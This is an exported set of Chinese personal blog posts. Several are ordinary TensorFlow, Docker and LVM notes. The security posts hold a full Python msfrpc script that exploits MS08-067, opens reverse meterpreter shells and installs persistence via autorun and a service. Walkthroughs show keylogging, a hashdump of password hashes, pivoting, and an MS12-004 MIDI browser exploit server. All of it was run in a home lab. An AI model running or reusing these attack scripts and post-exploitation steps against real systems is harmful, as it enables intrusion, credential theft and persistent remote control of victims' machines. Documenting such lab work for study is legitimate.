[{"title":"TensorFlow环境搭建","date":"2017-03-19T15:52:42.000Z","path":"ml/TensorFlow环境搭建/","text":"前言 虽然之前零零散散的有看过TensorFlow, 但前些天才买了一本《TensorFlow实战》来系统的进行学习，所以这里记录一些笔记，以供备忘 测试环境搭建安装Anaconda3 之前自己本地使用的都是Anaconda2, 看到越来越多的东西都在推Py3,所以折腾TF的时候也安装个Anaconda3 123通过其官网下载命令行安装版https://repo.continuum.io/archive/Anaconda3-4.3.1-MacOSX-x86_64.sh然后直接 bash Anaconda3-4.3.1-MacOSX-x86_64.sh 安装成功后提示修改PATH由于我使用的是zsh，所以直接修改.zshrc文件即可 1234567891011121314151617installing: conda-env-2.6.0-0 ...Python 3.6.0 :: Continuum Analytics, Inc.creating default environment...installation finished.Do you wish the installer to prepend the Anaconda3 install locationto PATH in your /Users/tp/.bash_profile ? [yes|no][yes] &gt;&gt;&gt;Prepending PATH=/Users/tp/anaconda3/bin to PATH in /Users/tp/.bash_profileA backup will be made to: /Users/tp/.bash_profile-anaconda3.bakFor this change to become active, you have to open a new terminal.Thank you for installing Anaconda3!Share your notebooks and packages on Anaconda Cloud!Sign up for free: https://anaconda.org .zshrc中加入PATH1export PATH=&quot;/Users/tp/anaconda3/bin:$PATH&quot; 通过Anaconda安装TensorFlow环境1234567891011121314151617181920212223242526272829303132333435363738➜ ~ conda create -n tensorflow python=3.5Fetching package metadata ...........Solving package specifications: .Package plan for installation in environment /Users/tp/anaconda3/envs/tensorflow:The following NEW packages will be INSTALLED: openssl: 1.0.2k-1 pip: 9.0.1-py35_1 python: 3.5.3-1 readline: 6.2-2 setuptools: 27.2.0-py35_0 sqlite: 3.13.0-0 tk: 8.5.18-0 wheel: 0.29.0-py35_0 xz: 5.2.2-1 zlib: 1.2.8-3Proceed ([y]/n)? yopenssl-1.0.2k 100% |################################| Time: 0:00:01 1.72 MB/sreadline-6.2-2 100% |################################| Time: 0:00:00 11.93 MB/ssqlite-3.13.0- 100% |################################| Time: 0:00:00 6.10 MB/stk-8.5.18-0.ta 100% |################################| Time: 0:00:00 3.84 MB/sxz-5.2.2-1.tar 100% |################################| Time: 0:00:00 1.15 MB/szlib-1.2.8-3.t 100% |################################| Time: 0:00:00 8.54 MB/spython-3.5.3-1 100% |################################| Time: 0:00:02 5.15 MB/ssetuptools-27. 100% |################################| Time: 0:00:00 5.15 MB/swheel-0.29.0-p 100% |################################| Time: 0:00:00 6.24 MB/spip-9.0.1-py35 100% |################################| Time: 0:00:00 4.64 MB/s## To activate this environment, use:# &gt; source activate tensorflow## To deactivate this environment, use:# &gt; source deactivate tensorflow#","tags":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://yoursite.com/tags/TensorFlow/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/机器学习/"}]},{"title":"Docker 笔记","date":"2017-03-18T07:16:01.000Z","path":"virtualization/Docker笔记/","text":"安装Docker Docker官方脚本1curl -sSL https://get.docker.com/ | sh 阿里云脚本 1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh - DaoCloud脚本 1curl -sSL https://get.daocloud.io/docker | sh 常用操作退出正在运行的容器 不是终止 1先ctrl+p再ctrl+q 检查Docker服务是否运行1ps aux | grep docker 查找镜像 以kali为例1docker search kali 删除所有没有运行的容器1234567➜ ~ docker rm $(docker ps -a | grep Exited | awk &apos;&#123;print $1&#125;&apos;)bcb7eddb6e6fc9175726acaf115104b12746934a087667bd8b20759d9e60d484e3abffa1 修改镜像名字 before 1daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MB 改名1➜ ~ docker tag daocloud.io/library/ubuntu:xenial-20160809 ubuntu:latest 可以看到除了REPOSITORY和TAG 其他的都一样12daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MBubuntu latest f8d79ba03c00 13 days ago 126.4 MB 然后删除之前的别名 123➜ ~ docker rmi daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu@sha256:746fa32ad3473c57c6a80b9addc1629937778b074b885dcdd9f3366250605850 设置docker开机启动 如果没设置docker服务开机启动的话，先运行命令chkconfig –add docker1在运行docker run的时候再加上命令 --restart=always 修改容器配置 对于已经在运行的容器，可通过如下命令进入容器中进行配置1docker exec -it $container_id /bin/bash 修改源1234567新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\\docker\\config\\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：&#123; &quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"LVM相关介绍","date":"2016-09-20T14:54:45.000Z","path":"server/LVM相关介绍/","text":"LVM概念 Logical Volume Manager 逻辑卷管理 12通过将底层物理硬盘抽象封装起来，以逻辑卷的形式表现给上层系统，逻辑卷的大小可以动态调整，而且不会丢失现有数据。新加入的硬盘也不会改变现有上层的逻辑卷。作为一种多台磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。 LVM的4个基本概念1234567① PE (Physical Extend) 物理拓展② PV (Physical Volume) 物理卷③ VG (Volume Group) 卷组④ LV (Logical Volume) 逻辑卷 PE逻辑卷空间管理的最基本单位。1个PE默认是4M大小VG的作用是用来装PV的–空间池 创建LVM123456789101112131415161718➜ ~ fdisk -lDisk /dev/sda: 300 GiB, 322122547200 bytes, 629145600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xc1fc20aeDevice Boot Start End Sectors Size Id Type/dev/sda1 * 2048 612370431 612368384 292G 83 Linux/dev/sda2 612372478 629143551 16771074 8G 5 Extended/dev/sda5 612372480 629143551 16771072 8G 82 Linux swap / SolarisDisk /dev/sdb: 50 GiB, 53687091200 bytes, 104857600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes 将物理磁盘设备初始化为物理卷12➜ ~ pvcreate /dev/sdb Physical volume &quot;/dev/sdb&quot; successfully created 查看物理卷信息123➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb lvm2 --- 50.00g 50.00g 创建卷组，并将PV加入卷组中123&gt;名字为lvmtest， 可任意➜ ~ vgcreate lvmtest /dev/sdb Volume group &quot;lvmtest&quot; successfully created 12345678910111213141516171819202122232425➜ ~ vgs VG #PV #LV #SN Attr VSize VFree lvmtest 1 0 0 wz--n- 50.00g 50.00g&gt;查看卷组信息➜ ~ vgdisplay --- Volume group --- VG Name lvmtest System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 1 VG Access read/write VG Status resizable MAX LV 0 Cur LV 0 Open LV 0 Max PV 0 Cur PV 1 Act PV 1 VG Size 50.00 GiB PE Size 4.00 MiB Total PE 12799 Alloc PE / Size 0 / 0 Free PE / Size 12799 / 50.00 GiB VG UUID cxMG1m-pMAE-Suk5-bM69-1sB3-W7YB-WXmmGh 基于卷组创建逻辑卷 这里我从lvmtest拿了20G空间来创建了一个名为lv1的逻辑卷 12➜ ~ lvcreate -n lv1 -L 20G lvmtest Logical volume &quot;lv1&quot; created 查看逻辑卷信息1234567891011121314151617181920➜ ~ lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert lv1 lvmtest -wi-a----- 20.00g ➜ ~ lvdisplay --- Logical volume --- LV Path /dev/lvmtest/lv1 LV Name lv1 VG Name lvmtest LV UUID Q4UIbv-yWhL-Bl5A-ywTN-1HJo-TE5r-TKBPfQ LV Write Access read/write LV Creation host, time kali, 2016-08-03 08:44:31 +0800 LV Status available # open 0 LV Size 20.00 GiB Current LE 5120 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 为创建好的逻辑卷创建文件系统 123456789101112➜ ~ mkfs.ext4 /dev/lvmtest/lv1mke2fs 1.42.12 (29-Aug-2014)Creating filesystem with 5242880 4k blocks and 1310720 inodesFilesystem UUID: 5130e6e1-8293-4fcb-b580-5091f3840f99Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done 将格式化好的逻辑卷挂载使用 1➜ ~ mount /dev/lvmtest/lv1 /mnt/ 查看12➜ /mnt mount | tail -n 1/dev/mapper/lvmtest-lv1 on /mnt type ext4 (rw,relatime,data=ordered) 删除LVM 先把相应的东西umount掉1➜ ~ umount /mnt 12➜ ~ mount | tail -n 1/dev/sr0 on /media/cdrom0 type iso9660 (ro,nosuid,nodev,noexec,relatime,user) 删除LV 123➜ ~ lvremove /dev/lvmtest/lv1Do you really want to remove active logical volume lv1? [y/n]: y Logical volume &quot;lv1&quot; successfully removed 删除VG 12➜ ~ vgremove lvmtest Volume group &quot;lvmtest&quot; successfully removed 删除物理卷 12➜ ~ pvremove /dev/sdb Labels on physical volume &quot;/dev/sdb&quot; successfully wiped 扩充逻辑卷容量 逻辑卷的拉伸操作可以在线执行，不需要卸载逻辑卷 保证VG中有足够的空闲空间 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 1 1 0 wz--n- 50.00g 30.00g 扩充逻辑卷 123➜ ~ lvextend -L +1G /dev/vg/lv Size of logical volume vg/lv changed from 20.00 GiB (5120 extents) to 21.00 GiB (5376 extents). Logical volume lv successfully resized 查看扩充后LV大小 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 21.00 GiB Current LE 5376 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 更新文件系统 12345➜ ~ resize2fs /dev/vg/lvresize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/vg/lv is mounted on /mnt; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 2The filesystem on /dev/vg/lv is now 5505024 (4k) blocks long. 查看更新后文件系统 123456789101112➜ ~ df -hFilesystem Size Used Avail Use% Mounted onudev 10M 0 10M 0% /devtmpfs 792M 9.1M 783M 2% /run/dev/sda1 288G 16G 257G 6% /tmpfs 2.0G 208K 2.0G 1% /dev/shmtmpfs 5.0M 0 5.0M 0% /run/locktmpfs 2.0G 0 2.0G 0% /sys/fs/cgrouptmpfs 396M 8.0K 396M 1% /run/user/132tmpfs 396M 12K 396M 1% /run/user/0/dev/sr0 3.1G 3.1G 0 100% /media/cdrom0/dev/mapper/vg-lv 21G 44M 20G 1% /mnt 扩充卷组容量 将要添加到VG的硬盘格式化为PV 12➜ ~ pvcreate /dev/sdc Physical volume &quot;/dev/sdc&quot; successfully created 将新的PV添加到指定卷组中 12➜ ~ vgextend vg /dev/sdc Volume group &quot;vg&quot; successfully extended 查看扩充后VG大小 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 2 1 0 wz--n- 69.99g 48.99g 缩小逻辑卷容量 逻辑卷的缩小操作必须离线执行，要卸载逻辑卷 卸载一键挂载的逻辑卷 1➜ ~ umount /dev/mapper/vg-lv 缩小文件系统 缩小为10G 1234567891011121314151617181920➜ ~ resize2fs /dev/vg/lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/vg/lv&apos; first.➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/mapper/vg-lv&apos; first.➜ ~ e2fsck -f /dev/mapper/vg-lve2fsck 1.42.12 (29-Aug-2014)Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary information/dev/mapper/vg-lv: 11/1376256 files (0.0% non-contiguous), 130401/5505024 blocks➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Resizing the filesystem on /dev/mapper/vg-lv to 2621440 (4k) blocks.The filesystem on /dev/mapper/vg-lv is now 2621440 (4k) blocks long. 缩小LV 缩小的容量为之前的容量减去文件系统容量21-10=11 123456➜ ~ lvreduce -L -11G /dev/vg/lv WARNING: Reducing active logical volume to 10.00 GiB THIS MAY DESTROY YOUR DATA (filesystem etc.)Do you really want to reduce lv? [y/n]: y Size of logical volume vg/lv changed from 21.00 GiB (5376 extents) to 10.00 GiB (2560 extents). Logical volume lv successfully resized 查看缩小后的LV 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 10.00 GiB Current LE 2560 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 挂载 123➜ ~ mount /dev/vg/lv /mnt➜ ~ mount | tail -n 1/dev/mapper/vg-lv on /mnt type ext4 (rw,relatime,data=ordered) 缩小卷组 将一个PV从制定卷组中移除 12➜ ~ vgreduce vg /dev/sdc Removed &quot;/dev/sdc&quot; from volume group &quot;vg&quot; 查看缩小后的卷组大小 123456789101112131415161718192021~ vgdisplay--- Volume group ---VG Name vgSystem ID Format lvm2Metadata Areas 1Metadata Sequence No 8VG Access read/writeVG Status resizableMAX LV 0Cur LV 1Open LV 1Max PV 0Cur PV 1Act PV 1VG Size 50.00 GiBPE Size 4.00 MiBTotal PE 12799Alloc PE / Size 2560 / 10.00 GiBFree PE / Size 10239 / 40.00 GiBVG UUID E32ZJW-3NqL-jpr2-1KYN-QWDh-dZhJ-1ZxZ2i 移除物理卷 12345678910➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g /dev/sdc lvm2 --- 20.00g 20.00g➜ ~ pvremove /dev/sdc Labels on physical volume &quot;/dev/sdc&quot; successfully wiped➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g➜ ~","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"LVM","slug":"LVM","permalink":"http://yoursite.com/tags/LVM/"}]},{"title":"[Demo] MSF检测指定服务的漏洞","date":"2016-08-11T15:00:13.000Z","path":"sec/Demo-MSF检测指定服务的漏洞/","text":"#相关资源 SpiderLabs/msfrpc Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# -*- coding: utf-8 -*-'''用MSF检测指定服务的漏洞本脚本以 MS08-067为例'''__author__ = \"SanNa\"import osimport msfrpcimport optparseimport sysfrom time import sleepLOGIN = 'msf'PASSWD = 'abc123'def builder(RHOST, LHOST, LPORT): '''根据相关信息创建文件 :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 ''' postcomms = \"\"\"getsystem run persistence -S -U -X -i 10 -p 80 -r \"\"\"+LHOST+\"\"\" cd c:\\\\ upload /tmp/ms08067_patch.exe c:\\\\ upload /tmp/ms08067_install.bat c:\\\\ execute -f ms08067_install.bat \"\"\" batcomm = \"ms08067_patch.exe /quiet\" with open ('/tmp/smbpost.rc', 'w') as post, open('/tmp/ms08067_install.bat', 'w') as bat: post.write(postcomms) bat.write(batcomm)def sploiter(RHOST, LHOST, LPORT, session): '''连接到msfconsole :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 :param session: session ''' client = msfrpc.Msfrpc(&#123;&#125;) client.login(LOGIN, PASSWD) ress = client.call('console.create') console_id = ress['id'] # Exploit MS08-067 commands = \"\"\"use exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/meterpreter/reverse_tcp set RHOST \"\"\"+RHOST+\"\"\" set LHOST \"\"\"+LHOST+\"\"\" set LPORT \"\"\"+LPORT+\"\"\" set ExitOnSession false exploit -z \"\"\" print \"[+] Exploiting MS08-067 on: \" + RHOST client.call('console.write',[console_id,commands]) res = client.call('console.read',[console_id]) result = res['data'].split('\\n') # 运行攻击脚本 runPost = \"\"\"use post/multi/gather/run_console_rc_file set RESOURCE /tmp/smbpost.rc set SESSION \"\"\"+session+\"\"\" exploit \"\"\" print \"[+] Running post-exploit script on: \" + RHOST client.call('console.write',[console_id,runPost]) rres = client.call('console.read',[console_id]) #Setup Listener for presistent connection back over port 80 sleep(10) listen = \"\"\"use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LPORT 80 set LHOST \"\"\"+LHOST+\"\"\" exploit \"\"\" print \"[+] Setting up listener on: \" + LHOST + \":80\" client.call('console.write',[console_id,listen]) lres = client.call('console.read',[console_id]) print lresdef main(): parser = optparse.OptionParser(sys.argv[0] +\\ ' -p LPORT -r RHOST -l LHOST -s session') parser.add_option('-p', dest='LPORT', type='string', \\ help ='specify a port to listen on') parser.add_option('-r', dest='RHOST', type='string', \\ help='Specify a remote host') parser.add_option('-l', dest='LHOST', type='string', \\ help='Specify a local host') parser.add_option('-s', dest='session', type='string', \\ help ='specify session ID') (options, args) = parser.parse_args() session=options.session RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT if (RHOST == None) and (LPORT == None) and (LHOST == None): print parser.usage sys.exit(0) builder(RHOST, LHOST, LPORT) sploiter(RHOST, LHOST, LPORT, session)if __name__ == \"__main__\": main() 执行方式12345➜ ~ python 333msf.py -p 4444 -r 192.168.1.43 -l 192.168.1.8 -s 8[+] Exploiting MS08-067 on: 192.168.1.43[+] Running post-exploit script on: 192.168.1.43[+] Setting up listener on: 192.168.1.8:80[&#123;\"prompt\": \"\\u0001\\u0002msf\\u0001\\u0002 post(\\u0001\\u0002\\u0001\\u0002run_console_rc_file\\u0001\\u0002) \\u0001\\u0002&gt; \", \"busy\": true, \"data\": \"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\\nRHOST =&gt; 192.168.1.43\\nLHOST =&gt; 192.168.1.8\\nLPORT =&gt; 4444\\nExitOnSession =&gt; false\\n[*] Started reverse TCP handler on 192.168.1.8:4444 \\n[*] Automatically detecting the target...\\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\\n[*] Attempting to trigger the vulnerability...\\n[*] Sending stage (957487 bytes) to 192.168.1.43\\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\\n[*] Session 8 created in the background.\\nRESOURCE =&gt; /tmp/smbpost.rc\\nSESSION =&gt; 7\\n[*] Running module against DH-CA8822AB9589\\n[*] Running command getsystem\\n[*] Running command run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\\n\"&#125;] 执行脚本时msf端命令行回显123456789101112[*] Running Persistance Script[*] Resource file for cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80[*] Persistent agent script is 148419 bytes long[+] Persistent Script written to C:\\WINDOWS\\TEMP\\IezQttslf.vbs[*] Executing script C:\\WINDOWS\\TEMP\\IezQttslf.vbs[+] Agent executed with PID 2720[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[*] Installing as service..[*] Creating service YsimPwZAk[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800 session12345678910111213msf &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 7 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43) 8 meterpreter x86/win32 NT AUTHORITY\\SYSTEM @ DH-CA8822AB9589 192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)msf &gt; sessions -i 8[*] Starting interaction with 6... 相关操作12345678910111213141516171819202122232425262728meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32meterpreter &gt; shellProcess 3492 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\Documents and Settings\\Administrator&gt;","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Test-MS08-067","date":"2016-08-10T13:44:42.000Z","path":"sec/Test-MS08-067/","text":"环境1234Kali2.0192.168.1.8WinXPenSP3192.168.1.43 Start123msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp Show Option12345678910111213141516171819202122232425msf exploit(ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic Targeting Set Option1234msf exploit(ms08_067_netapi) &gt; set RhOST 192.168.1.43RhOST =&gt; 192.168.1.43msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.1.8LHOST =&gt; 192.168.1.8 Exploit123456789101112131415161718msf exploit(ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 192.168.1.8:4444[*] Automatically detecting the target...[*] Fingerprint: Windows XP - Service Pack 3 - lang:English[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] Attempting to trigger the vulnerability...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800meterpreter &gt; lsListing: C:\\WINDOWS\\system32============================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 1482 fil 2011-08-14 13:40:01 +0800 $winnt$.inf40777/rwxrwxrwx 0 dir 2011-08-14 21:19:31 +0800 1025 Shell1234567891011121314151617181920meterpreter &gt; shellProcess 1004 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\WINDOWS\\system32&gt; 常用手法截屏12meterpreter &gt; screenshotScreenshot saved to: /root/Fyjiynwg.jpeg 获取系统信息12345678meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32 目标系统正在运行的进程1234567891011meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\\SYSTEM 128 676 VMUpgradeHelper.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMUpgradeHelper.exe 560 4 smss.exe x86 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 键盘记录 使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C 123456789101112meterpreter &gt; migrate 1652[*] Migrating from 1032 to 1652...[*] Migration completed successfully.meterpreter &gt; run post/windows/capture/keylog_recorder[*] Executing module against DH-CA8822AB9589[*] Starting the keystroke sniffer...[*] Keystrokes being saved in to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt[*] Recording keystrokes...^C[*] Saving last few keystrokes...[*] Interrupt[*] Stopping keystroke sniffer... 获取密码哈希值12345678meterpreter &gt; hashdumpAdministrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::IWAM_DH-CA8822AB9589:1004:90b05d38a1fc8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::meterprete 将目标机器作为跳板1234567891011121314meterpreter &gt; run get_local_subnetsLocal subnet: 192.168.1.0/255.255.255.0meterpreter &gt; background[*] Backgrounding session 1...msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1[*] Route addedmsf exploit(ms08_067_netapi) &gt; route printActive Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 192.168.3.0 255.255.255.0 Session 1","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Metasploit-MIDI文件解析远程代码执行","date":"2016-08-09T14:40:46.000Z","path":"sec/Metasploit-MIDI文件解析远程代码执行/","text":"启动msf1234567[*] Processing setup.rc for ERB directives.resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msfresource (setup.rc)&gt; load msgrpc User=msf Pass='abc123'[*] MSGRPC Service: 127.0.0.1:55552[*] MSGRPC Username: msf[*] MSGRPC Password: abc123[*] Successfully loaded plugin: msgrpc 搜索和使用漏洞模块123456789101112msf &gt; search 12-004[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/browser/ms12_004_midi 2012-01-10 normal MS12-004 midiOutPlayNextPolyEvent Heap Overflowmsf &gt; use exploit/windows/browser/ms12_004_midi 显示和设置相关Option123456789101112131415161718192021222324252627282930313233msf exploit(ms12_004_midi) &gt; show optionsModule options (exploit/windows/browser/ms12_004_midi): Name Current Setting Required Description ---- --------------- -------- ----------- OBFUSCATE false no Enable JavaScript obfuscation SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Exploit target: Id Name -- ---- 0 Automaticmsf exploit(ms12_004_midi) &gt; set SRVHOST 192.168.1.8SRVHOST =&gt; 192.168.1.8msf exploit(ms12_004_midi) &gt; set URIPATH /URIPATH =&gt; /msf exploit(ms12_004_midi) &gt; set LPORT 1234LPORT =&gt; 1234msf exploit(ms12_004_midi) &gt; exploit[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.1.8:1234[*] Using URL: http://192.168.1.8:8080/[*] Server started. 使用目标主机IE浏览器打开URL后控制台输出为1234567891011*] 192.168.1.43 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)[*] 192.168.1.43 ms12_004_midi - Sending html to 192.168.1.43:2933...[*] 192.168.1.43 ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503[*] 192.168.1.43 ms12_004_midi - Sending midi corruption file...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript 'migrate -f'[*] Current server process: iexplore.exe (372)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3948[+] Successfully migrated to process 查看和使用session1234567891011121314151617181920212223242526272829303132333435363738sf exploit(ms12_004_midi) &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43) 2 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)msf exploit(ms12_004_midi) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter 